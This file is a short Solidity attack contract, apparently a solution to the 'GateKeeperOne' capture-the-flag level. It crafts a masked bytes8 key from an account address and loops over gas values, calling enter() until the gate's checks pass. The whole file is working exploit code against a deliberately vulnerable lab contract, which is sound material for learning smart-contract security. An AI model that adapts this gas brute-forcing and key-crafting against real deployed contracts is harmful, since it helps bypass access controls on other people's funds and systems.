// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol";
import './GateKeeperOne.sol';

contract GateKeeperOneAttack{
    using SafeMath for uint256;
    bytes8 txOrigin16 = 0x0C86959fD5a284eA; //last 16 digits of your account
    bytes8 key = txOrigin16 & 0xFFFFFFFF0000FFFF; 
    GateKeeperOne public gkpOne;

 
    constructor(address _addr) public{
        gkpOne = GateKeeperOne(_addr);
    }
    
    function letMeIn() public{
         for (uint256 i = 0; i < 220; i++) {
         (bool result, ) = address(gkpOne).call{gas:
          i + 150 + 8191*3}(abi.encodeWithSignature("enter(bytes8)", key)); 
      if(result)
        {
        break;
      }
    }
  }
        
    
}